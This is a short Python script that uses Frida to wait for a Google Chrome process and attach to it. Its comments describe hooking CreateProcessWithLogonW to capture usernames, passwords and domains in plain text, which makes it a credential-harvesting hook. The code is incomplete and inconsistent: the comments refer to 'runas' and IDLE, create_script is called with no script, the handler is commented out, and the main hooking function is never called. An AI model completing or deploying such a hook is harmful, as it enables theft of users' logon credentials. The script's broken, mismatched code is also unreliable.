import frida
from time import sleep
import psutil
from threading import Lock, Thread

# Locking the runas thread to prevent other threads
# interfering with our current session
Google_lock = Lock()


def wait_for_google():
    while True:
        # Trying to find if IDLE is running if so, execute the "RunAs" function.

        if ("Google Chrome" in (p.name() for p in psutil.process_iter())) and not Google_lock.locked():
            Google_lock.acquire()  # Locking the runas thread
            print("[+] Found Google Chrome")
            session = frida.attach("Google Chrome")
            sleep(0.5)

        elif "Google Chrome" not in (p.name() for p in psutil.process_iter()) and Google_lock.locked():
            Google_lock.release()
            print("[+] Google Chrome is dead releasing lock")
        sleep(0.5)


def google():
    try:
        # Attaching to the runas process
        print("[+] Trying To Attach To Runas")
        session = frida.attach("Google Chrome")
        print("[+] Attached runas!")

        # Executing the following javascript We Listen to the CreateProcessWithLogonW func from Advapi32.dll to catch
        # the username,password,domain and the executing program 		  in plain text.
        script = session.create_script()

        # If we got a hit then execute the "on_message_runas" function
        #script.on('message', on_message_runas)
        script.load()
    except Exception as e:
        print(e)


wait_for_google()
